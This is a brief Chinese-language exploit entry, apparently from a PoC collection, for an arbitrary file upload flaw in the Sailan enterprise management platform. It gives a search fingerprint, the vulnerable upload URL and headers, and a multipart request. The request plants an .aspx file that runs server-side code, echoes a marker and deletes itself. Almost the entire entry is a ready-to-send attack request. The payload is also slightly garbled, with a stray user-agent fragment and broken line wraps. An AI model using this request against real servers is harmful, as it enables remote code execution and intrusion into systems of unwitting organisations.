# 赛蓝企业管理平台System_FocusList任意文件上传

- **系统**：赛蓝企业管理平台System_FocusList　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="www.cailsoft.com"`
- **请求**：`POST /SystemModule/System_FocusList/SubmitUploadify?FolderId=1&UserId=1 HTTP/1.1`
- **关键头**：`Host: {{Hostname}}`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryD5Mawpg0…`

**请求体 / payload**
```
Gecko) Chrome/99.0.4844.74 Safari/537.36
------WebKitFormBoundaryD5Mawpg068t7pbxZ
Content-Disposition: form-data; name="Filedata"; filename="11.aspx" Content-Type: image/png
<%@Page Language="C#"%>
<%Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.From
Base64String("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));System.I
O.File.Delete(Request.PhysicalPath);%>
------WebKitFormBoundaryD5Mawpg068t7pbxZ--
```
- **预期**：200　|　—